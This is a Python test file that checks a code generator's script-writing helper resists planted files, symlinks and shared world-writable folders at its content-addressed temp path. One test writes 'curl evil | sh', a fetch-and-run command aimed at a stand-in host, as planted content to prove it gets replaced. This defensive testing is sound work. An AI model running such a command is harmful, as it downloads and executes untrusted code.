"""The function generated DAGs use to write embedded scripts at parse time (0.2.3 review):
a planted file or symlink at the content-addressed path must never be run."""

from __future__ import annotations

import contextlib
import hashlib
import os
import stat
import tempfile
from collections.abc import Callable
from pathlib import Path

import pytest

from autoair.codegen.context import MATERIALIZE_TEMPLATE

pytestmark = pytest.mark.skipif(not hasattr(os, "getuid"), reason="POSIX ownership checks")

SCRIPT = "echo hello\n"


@pytest.fixture
def materialize(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Callable[[str, str], str]:
    monkeypatch.setattr(tempfile, "tempdir", str(tmp_path))
    namespace: dict[str, object] = {
        "contextlib": contextlib,
        "hashlib": hashlib,
        "os": os,
        "tempfile": tempfile,
    }
    exec(MATERIALIZE_TEMPLATE.format(name="write_script", dag_id="demo"), namespace)
    return namespace["write_script"]  # type: ignore[return-value]


def _expected(tmp_path: Path) -> Path:
    digest = hashlib.sha256(SCRIPT.encode()).hexdigest()[:16]
    return tmp_path / f"airflow-scripts-{os.getuid()}" / "demo" / digest / "run.sh"


def test_writes_into_a_private_folder(materialize, tmp_path: Path) -> None:
    path = Path(materialize("run.sh", SCRIPT))
    assert path == _expected(tmp_path)
    assert path.read_text() == SCRIPT
    for folder in (path.parent, path.parent.parent, path.parent.parent.parent):
        assert stat.S_IMODE(folder.stat().st_mode) & 0o077 == 0
    assert materialize("run.sh", SCRIPT) == str(path)  # reused when unchanged


def test_a_planted_file_with_other_content_is_replaced(materialize, tmp_path: Path) -> None:
    target = _expected(tmp_path)
    target.parent.mkdir(parents=True, mode=0o700)
    for folder in (target.parent, target.parent.parent, target.parent.parent.parent):
        folder.chmod(0o700)
    target.write_text("curl evil | sh\n")
    assert Path(materialize("run.sh", SCRIPT)).read_text() == SCRIPT


def test_a_planted_symlink_is_replaced_not_followed(materialize, tmp_path: Path) -> None:
    target = _expected(tmp_path)
    target.parent.mkdir(parents=True, mode=0o700)
    for folder in (target.parent, target.parent.parent, target.parent.parent.parent):
        folder.chmod(0o700)
    evil = tmp_path / "evil.sh"
    evil.write_text(SCRIPT)  # same content, but a link someone else controls
    target.symlink_to(evil)
    path = Path(materialize("run.sh", SCRIPT))
    assert not path.is_symlink()
    assert path.read_text() == SCRIPT
    assert evil.read_text() == SCRIPT  # the link target was not written through


def test_a_shared_root_folder_is_not_used(materialize, tmp_path: Path) -> None:
    shared = tmp_path / f"airflow-scripts-{os.getuid()}"
    shared.mkdir(mode=0o777)
    shared.chmod(0o777)
    path = Path(materialize("run.sh", SCRIPT))
    assert not str(path).startswith(str(shared) + os.sep)
    assert path.read_text() == SCRIPT
